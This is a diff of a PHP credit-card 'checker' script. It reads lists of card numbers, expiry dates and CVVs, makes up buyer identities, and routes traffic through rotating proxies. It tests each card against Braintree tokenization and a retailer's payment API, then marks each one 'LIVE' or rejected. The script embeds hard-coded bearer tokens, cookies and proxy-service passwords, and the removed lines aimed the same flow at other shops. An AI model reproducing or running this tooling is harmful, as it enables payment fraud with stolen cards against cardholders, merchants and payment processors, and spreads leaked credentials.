@@ -23,6 +23,14 @@ $cc = $separar[0];
 $mes = $separar[1];
 $ano = $separar[2];
 $cvv = $separar[3];
+$binn = substr($cc,0,6);
+
+
+if(strlen($mes<='09')){
+        $mes1=substr($mes,1,2);
+    } else {
+        $mes1=$mes;
+    }
 $cc1 = substr($cc,0,4);
 $cc2 = substr($cc,4,4);
 $cc3 = substr($cc,8,4);
@@ -30,8 +38,6 @@ $cc4 = substr($cc,12,4);
 $cc5 = substr($cc,0,4);
 $cc6 = substr($cc,4,6);
 $cc7 = substr($cc,10,5);
-$binn = substr($cc,0,6);
-
 
 
 if($cbin == "3"){
@@ -40,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-// If(strlen($ano) > 2)
-// {
-//   $ano = substr($ano,2,2);
-// }
+If(strlen($ano) > 2)
+{
+  $ano = substr($ano,2,2);
+}
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -84,287 +90,193 @@ return $retorno;
 }
 
 function datosnombre(){
-	$nombre = file("lista_nombres.txt");
+  $nombre = file("lista_nombres.txt");
     $minombre = rand(0, sizeof($nombre)-1);
     $nombre = $nombre[$minombre];
-	return $nombre;
+  return $nombre;
 }
 function datosapellido(){
-	$apellido = file("lista_apellidos.txt");
+  $apellido = file("lista_apellidos.txt");
     $miapellido = rand(0, sizeof($apellido)-1);
     $apellido = $apellido[$miapellido];
-	return $apellido;
+  return $apellido;
 }
 
 
-function email($apellido){
-	$email = preg_replace('<\W+>', "", $apellido).rand(0000,9999)."@hotmail.com";
-	return $email;
+function email($nombre){
+  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
+  return $email;
 }
- function ibuuproxy(){
-  $proxySocks = file("Socks5.txt");
-   $myproxy = rand(0, sizeof($proxySocks)-1);
-   $proxySocks = $proxySocks[$myproxy];
- return $proxySocks;
-}
-
 
 ///$cpf = cpf(1);
 $nombre = datosnombre();
 $apellido = datosapellido();
-$email = email($apellido);
+// $email = email($nombre);
 $zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
-$username = 'lum-customer-hl_7873c611-zone-static_res';
-$password = 'p8txkzc6mq9h';
+$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
+$username = 'lum-customer-hl_6366aa06-zone-static_res';
+$password = 'a9by3kql965v';
 $port = 22225;
 $session = mt_rand();
 $super_proxy = 'zproxy.lum-superproxy.io';
+
 $ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
 $city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);
 
+function ibuuproxy(){
+  $poxySocks = file("Socks5.txt");
+   $myproxy = rand(0, sizeof($poxySocks)-1);
+   $poxySocks = $poxySocks[$myproxy];
+ return $poxySocks;
+}
 
-// echo $binn;
+$poxySocks5 = ibuuproxy();
+
+$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
+$lname = 'Wang';
+$email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
+ // $email2 = $fname.rand(10,999).'@yopmail.com';
+// //$password = 'P@5%Word';
+// $password2 = 'Hansabhen1@';
+$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
+$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
+
+$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 
-$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);
 
 
-#req1==============================================================================
-
-
-
+// curl_close($ch);
 
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://secure.gosell.io/tappaymentwidget/public/api/get_detail_by_bin_v2?bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
-// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
-# Uncomment the upper two lines if you have filled the upper login details
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'referer: https://secure.gosell.io/tappaymentwidget/public//tap_payment_widget_ui?style[base][color]=%23535353&style[base][lineHeight]=18px&style[base][fontFamily]=sans-serif&style[base][fontSmoothing]=antialiased&style[base][fontSize]=16px&style[base][::placeholder][color]=rgba(0%2C%200%2C%200%2C%200.26)&style[base][::placeholder][fontSize]=15px&style[invalid][color]=red&mid=null&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58&currencyCode[0]=KWD&labels[cardNumber]=CARD%20NUMBER&labels[expirationDate]=MM%2FYY&labels[cvv]=CVV&labels[cardHolder]=CARD%20HOLDER%20NAME&TextDirection=ltr&paymentAllowed[0]=VISA&paymentAllowed[1]=MASTERCARD&paymentAllowed[2]=AMEX&paymentAllowed[3]=MADA/',
-// 'user-agent: '.$browser.'',
-'x-requested-with: XMLHttpRequest'
-));
-// curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');
-
-$update = curl_exec($ch);
-
- $country = trim(strip_tags(getstr($update,'"country_name":"','"')));
- $bank = trim(strip_tags(getstr($update,'"bank":"','"')));
- $type = trim(strip_tags(getstr($update,'"card_type":"','"')));
- $category = trim(strip_tags(getstr($update,'"card_category":"','"')));
- $brand = trim(strip_tags(getstr($update,' "card_brand":"','"')));
-
-
-
-
-curl_close($ch);
-
-// echo $update;
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://backend.elabelz.com/users/signup');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1ODk4MjQ4MzYsImp0aSI6IjlhYTBkZGM1LTczYTQtNGNiOC04MTdjLWYwNzMzYzI4MzM2ZiIsInN1YiI6Im13ZndtcjJxamN0djQzbTkiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im13ZndtcjJxamN0djQzbTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7fX0.s2942yM6xzGj_P98DIoUhor0LbLqNUMrTffficRWOp0DGB1ZQBlajMiFVzu652tdEXpeYPopc5L8ejHWXv-_Ag',
+'braintree-version: 2018-05-10',
 'content-type: application/json',
-'country: sa',
-'currency: 5b9914161998f706d07fed75',
-'locale: en',
-'origin: https://www.elabelz.com',
-'referer: https://www.elabelz.com/sa/product/Coccolatini/pattern-printed-blue-beanie-3265183',
+'origin: https://assets.braintreegateway.com',
+'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","password":"meghashyam96","firstName":"Mason","lastName":"Warner","subscribeToNewsletters":false,"sessionUUID":"d0f433f5-bcb8-40c8-96e3-a47931a3ba4b"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"d74aaa3f-ec5f-4d4f-9b6f-212a0fae6e41"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Vincent Warner"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 
 $a_pago = curl_exec($ch);
 
-$refresh_token = trim(strip_tags(getstr($a_pago,'"accessToken":"','"')));
+$token = trim(strip_tags(getstr($a_pago,'"token":"','"')));
+
+ $country = trim(strip_tags(getstr($a_pago,'"countryOfIssuance":"','"')));
+ $bank = trim(strip_tags(getstr($a_pago,'"issuingBank":"','"')));
+ $type = trim(strip_tags(getstr($a_pago,'"debit":"','"')));
+ // $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
+ // $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
+
+
+  // echo $a_pago;
 
 
 
 
 
+// //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api2.checkout.com/v2/tokens/card');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_URL, 'https://www.chairmanmom.com/api/users/payment');
+
+//////////////////////// PROXY CALLS ////////////////////////////
+//               REMOVE '//' FOR PROXIES TO WORK BELOW
+
+//////////////////////// PROXYSCRAPE
+// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+//////////////////////// WEBSHARE
+// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
+
+//////////////////////// MANUAL Proxy List
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
+
+//////////////////////// LUMINATI
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// End Proxy Calls
+curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: application/json, text/javascript, */*; q=0.01',
+'Accept: application/json, text/plain, */*',
 'Accept-Encoding: gzip, deflate, br',
 'Accept-Language: en-US,en;q=0.9',
-'AUTHORIZATION: pk_a58d5722-4fd8-485f-ab9b-08cbe7568d21',
-'Content-Type: application/json',
-'Host: api2.checkout.com',
-'Origin: https://js.checkout.com',
-'Referer: https://js.checkout.com/frames/?v=1.0.16&publicKey=pk_a58d5722-4fd8-485f-ab9b-08cbe7568d21&theme=standard',
-'user-agent: '.$browser.''
+'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlJrWkNNak00TkVGRU5rTkJNVVpHUTBFNU0wSkNSRUV3TTBReU1UUXhOVEl3T1RSRE9VSTFPQSJ9.eyJodHRwczovL2NoYWlybWFubW9tLmNvbS9yb2xlcyI6WyJ1c2VyIl0sImh0dHBzOi8vY2hhaXJtYW5tb20uY29tL3VzZXJuYW1lIjoiaG90c2hvdDY5Iiwibmlja25hbWUiOiJob3RzaG90NjkiLCJuYW1lIjoidnZhcm5lckBnbWFpbC5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvY2FiMzdkMGZmYmM2YzY5Y2E5OTdmYWYyODA1NGNmYzY_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZ2di5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wNS0xN1QxODowMDoyMi43NzNaIiwiZW1haWwiOiJ2dmFybmVyQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9hdXRoLmNoYWlybWFubW9tLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZWMxN2JiMDU1OWI2YTBjNTA2YjVlMWMiLCJhdWQiOiJucFY4anVhcml3elo2akF2ZFptTmtHMkZiT1Z0b3AxWCIsImlhdCI6MTU4OTczODQzNCwiZXhwIjoxNTkyMzI5NDM0LCJhdF9oYXNoIjoiZHVCT1hLWEtKQjZEOGMybGRWQWJxdyIsIm5vbmNlIjoiVnVOZXVlbUJKZHN6aFI4M2p4T1oxekZpQlVRaWZuZlAifQ.M_UNyHC1Re4gNrW_LdvVR4JrNgGlW8Uk8n2ibT2bBYvXAErMpfz3d4cA9aw9cHr1vS41CICcKe7zIyECjkSMoBIkPkhZM2k6mYe1qSCP5wqxKMQ9j9T8WlgDbexsVB13SZxxuealwLwUQVEapTjWlxjMkYE-WWYIs2Rq7b3sROueEYIik5C8ObNpXX6VM-RMZGDdyGpXEg013ZOqrPUXwEMEW6QnWDApMXCJ_qmZDLTAkvricJL9yIJJZUdqUf3bK_CAQrg9C8TK_dtP04Z6irA_ewP_M-zbrNTjHQeJ1wRom8xSsF8JRKIxIcCyghI6elkGYrS1O9fdnw6zXmxHyg',
+'Content-Type: application/json;charset=UTF-8',
+'Cookie: co%2Fverifier%2Fhttps%253A%252F%252Fauth.chairmanmom.com%2FY6H9Y5gBEqz8=%22WPz-XIPiHpmzsTSvRbNYFm4v5zTyTKlE%22; auth0.ssodata=%22{%5C%22lastUsedConnection%5C%22:%5C%22Username-Password-Authentication%5C%22%2C%5C%22lastUsedSub%5C%22:%5C%22auth0|5ec17bb0559b6a0c506b5e1c%5C%22}%22',
+'Host: www.chairmanmom.com',
+'Origin: https://www.chairmanmom.com',
+'Referer: https://www.chairmanmom.com/Signup?step=payment',
+'User-Agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"number":"'.$cc.'","expiryMonth":"'.$mes.'","expiryYear":"'.$ano.'","cvv":"'.$cvv.'","requestSource":"JS"}');
+//////////////////////// START POST FILED 1 ////////////////////////
 
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_nonce":"'.$token.'"}');
 
-$b_pago = curl_exec($ch);
+// // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
- // echo $b_pago;
-$token = trim(strip_tags(getstr($b_pago,'"id":"','"')));
-// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-// $debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-// $prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
-// $cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));
-
-// $token2 = trim(strip_tags(getstr($b_pago,'"token":"','","creditCard"')));
-//$idempotency_key = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 8)), 0, 8);
-//$idempotency_key2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 9)), 0, 9);
-// echo $token;
-// echo $issuecountry;
-// echo $issuebank;
-
-
-// #==========================================================================================================
-
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://backend.elabelz.com/users/me/card');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
- // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
- // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-
-   curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'authorization: Bearer '.$refresh_token.'',
-'content-type: application/json',
-'country: us',
-'currency: 5b9914161998f706d07fed75',
-'locale: en',
-'origin: https://www.elabelz.com',
-'referer: https://www.elabelz.com/us/checkout',
-'user-agent: '.$browser.''
-));
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"name":"card","default":true,"token":"'.$token.'","provider":"Checkout"}');
 
 $result = curl_exec($ch);
-
-
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://secure.gosell.io/tappaymentwidget/public/api/get_detail_by_bin_v2?bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');
-// curl_setopt($ch, CURLOPT_HEADER, 0);
-// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-//  // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-//  // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// //  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-//    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'accept: */*',
-// 'accept-encoding: gzip, deflate, br',
-// 'accept-language: en-US,en;q=0.9',
-// 'cache-control: no-cache',
-// 'pragma: no-cache',
-// 'referer: https://secure.gosell.io/tappaymentwidget/public//tap_payment_widget_ui?style[base][color]=%23535353&style[base][lineHeight]=18px&style[base][fontFamily]=sans-serif&style[base][fontSmoothing]=antialiased&style[base][fontSize]=16px&style[base][::placeholder][color]=rgba(0%2C%200%2C%200%2C%200.26)&style[base][::placeholder][fontSize]=15px&style[invalid][color]=red&mid=null&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58&currencyCode[0]=KWD&labels[cardNumber]=CARD%20NUMBER&labels[expirationDate]=MM%2FYY&labels[cvv]=CVV&labels[cardHolder]=CARD%20HOLDER%20NAME&TextDirection=ltr&paymentAllowed[0]=VISA&paymentAllowed[1]=MASTERCARD&paymentAllowed[2]=AMEX&paymentAllowed[3]=MADA',
-// 'user-agent: '.$browser.''
-// ));
-// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');
-
-// $c_pago = curl_exec($ch);
-
-// echo $c_pago;
-
- $message = trim(strip_tags(getstr($result,'"message":"','"')));
-// // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));
-
-// // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));
-
-// // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));
-
-
- if(strpos($result,'"verified":true')){
-     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | '.$type.' | '.$category.'</font></b></font></td></tr>';
-   }
-	//  elseif(strpos($result, '"statusCode":500')){
-
- //      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
-
- // }
-
-
- else{
-
-
-     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | '.$type.' | '.$category.'</font></b></font></td></tr>';
-
-
-
-      // echo '<tr><td><font size="3"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="3">'.$lista.'</font></td><td><font size="3">&nbsp;&nbsp;&nbsp;<b>'.$result.' &nbsp;&nbsp;&nbsp;'.$bin.'</b></font></td></tr>';
-
-
-            }
-
+if (curl_errno($ch)) {
+    echo 'Error:'.curl_error($ch);
+}
 curl_close($ch);
+$message = trim(strip_tags(getstr($result,'"reason":"','"')));
+// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
+// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
+
+
+
+// /////////////////////// RESULT ////////////////////////////////////
+if(strpos($result,'"paymentMethod"')){
+// updatecart();
+        echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+
+    }
+elseif(strpos($result,'503 Service Temporarily Unavailable')) {
+
+         echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ E R R O R ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+
+  }
+
+else {
+      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+
+  }
+curl_close($curl);
 ob_flush();
-   // echo $result;
- // echo $c_pago;
+    // echo $result;
+//echo $browser;
 ?>
